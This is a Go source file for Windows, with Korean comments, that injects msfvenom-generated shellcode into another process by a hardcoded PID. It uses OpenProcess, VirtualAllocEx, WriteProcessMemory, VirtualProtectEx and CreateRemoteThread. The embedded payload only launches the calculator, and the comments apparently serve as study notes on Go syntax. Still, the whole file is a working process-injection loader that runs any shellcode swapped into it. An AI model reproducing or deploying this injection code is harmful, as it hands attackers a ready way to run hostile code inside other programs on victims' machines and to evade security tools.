package main

import (
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	pid := uint32(21336) // PID of the process to inject shellcode into, pid 변수에 프로세스 ID(21336)를 저장
	PROCESS_ALL_ACCESS := windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xffff // 프로세스에 대한 모든 접근 권한을 가짐

	//msfvenom  -f hex -p windows/x64/exec cmd=calc
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300") // sc 변수에 셸코드를 저장, _는 에러를 무시
	fmt.Printf("get a handle on process with id: %d : %v", pid, sc) // 프로세스 ID와 셸코드를 출력
	pHandle, err := windows.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, pid)
	if err != nil {
		fmt.Printf("Error opening process: %v", err) // 프로세스를 열 때 에러가 발생하면 에러를 출력, %v는 임의의 값을 출력, err는 에러 메시지 %v에 err을 출력
		return
	}
	fmt.Printf("got a handle 0x%x on process with id: %d\n", pHandle, pid)
	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modKernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)

	if addr == 0 {
		fmt.Printf("Error allocating memory: %v\n", lastErr)
		return
	}
	fmt.Printf("Allocated Memory address: 0x%x\n", addr)

	var numberOfBytesWritten uintptr // uintptr는 포인터의 크기에 따라 정수형의 크기가 달라짐
	err = windows.WriteProcessMemory(pHandle, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten) // WriteProcessMemory 함수를 사용하여 프로세스 메모리에 셸코드를 쓰기
	if err != nil {
		fmt.Printf("Error writing process memory: %v\n", err)
		return
	}
	fmt.Printf("wrote shellcode(%d/%d) bytes to destination address\n", numberOfBytesWritten, len(sc))

	var oldProtect uint32
	err = windows.VirtualProtectEx(pHandle, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		fmt.Printf("Error VirtualProtectEx Failed: %v\n", err)
		return
	}

	procCreateRemoteThread := modKernel32.NewProc("CreateRemoteThread")
	var threadId uint32 = 0 // 새로운 스레드의 ID를 저장할 변수를 선언
	// =는 이미 선언된 변수에 값을 할당할 때 사용, 새로운 변수 선언 x, 기존 변수 값 변경
	// := 는 새 변수 선언 및 초기화 때 사용, :=를 사용할 경우 go compiler가 자동으로 변수 타입 추론
	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if tHandle == 0 {
		fmt.Printf("unable to create remote thread: %v\n", lastErr)
		return
	}
	fmt.Printf("handle of new created thread : 0x%x\n thread id: %d\n", tHandle, threadId)
}